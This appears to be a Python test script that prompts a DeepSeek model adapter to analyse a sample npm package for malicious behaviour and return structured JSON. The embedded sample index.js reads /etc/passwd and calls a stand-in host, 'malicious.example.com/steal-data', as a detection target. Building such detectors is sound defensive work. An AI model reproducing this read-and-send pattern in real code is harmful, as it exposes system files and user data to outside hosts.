# test_deepseek.py
import sys
from pathlib import Path
import time, json

project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

try:
    from src.models.providers.deepseek_adapter import DeepSeekAdapter
    print("Successfully imported deepseek_adapter\n")
except ImportError as e:
    print(f"Import error: {e}")
    sys.exit(1)


def main():
    config = {
        "torch_dtype": "float16",   
        "device_map": "auto",
        "max_new_tokens": 256,
        "temperature": 0.0,
        "top_k": 50,
        "top_p": 0.95,
        "do_sample": False
    }

    adapter = DeepSeekAdapter(config=config)

    prompt = r"""
            You are a cybersecurity expert specialized in analyzing NPM packages for malicious behavior.
            You are given package metadata and a short JavaScript file. Your task is to FILL THE JSON SKELETON BELOW based ONLY on the provided files.

            IMPORTANT RULES — FOLLOW EXACTLY:
            1) Return EXACTLY one JSON object, nothing else (no explanation, no markdown, no leading/trailing text).
            2) The JSON keys MUST be exactly:
            "package_name", "behaviors", "suspicious_patterns", "evidence", "confidence"
            3) If there are no behaviors or patterns, return empty lists/dicts (do not write "null" or text).
            4) Do NOT invent any extra keys or top-level fields.
            5) Use conservative confidences: if unsure, choose a low confidence (e.g., 0.15-0.4).
            6) The "confidence" field is a float in [0,1] summarizing aggregated confidence.
            7) All behaviors MUST be objects with keys: "id", "category", "summary", "details", "confidence".
            8) In "evidence" include { "file": "...", "line": N, "snippet": "..." } entries where applicable.
            9) If you cannot find any suspicious behavior, return the skeleton with empty lists and confidence 0.0.

            JSON SKELETON (fill values only):
            {
            "package_name": "",
            "behaviors": [
                /* Each item must be an object:
                {
                    "id": "b1",
                    "category": "data_exfiltration|network_call|filesystem_access|code_exec|dependency_abuse|typosquatting|other",
                    "summary": "",
                    "details": "",
                    "confidence": 0.0
                }
                */
            ],
            "suspicious_patterns": [
                /* short strings describing detected suspicious code patterns, e.g. "reads /etc/passwd", "HTTP post to external domain" */
            ],
            "evidence": {
                /* map filenames to evidence lists:
                "index.js": [ { "line": 3, "snippet": "fs.readFileSync('/etc/passwd', 'utf-8')" } ]
                */
            },
            "confidence": 0.0
            }

            Now analyze the package below and FILL the skeleton above exactly.

            ===PACKAGE.JSON===
            {"name": "example-malicious", "version":"1.0.0"}

            ===FILE: index.js===
            const fs = require('fs');
            const https = require('https');
            fs.readFileSync('/etc/passwd', 'utf-8');
            https.get('http://malicious.example.com/steal-data', res => {});
            """


    t0 = time.time()
    out = adapter.generate(prompt, max_new_tokens=256)
    t1 = time.time()

    print("Time (s):", t1 - t0)
    print("Raw output:\n", out[:2000])

    try:
        data = json.loads(out)
        print("Parsed JSON:", json.dumps(data, indent=2))
    except Exception as e:
        print("Failed to parse JSON:", e)

if __name__ == "__main__":
    main()
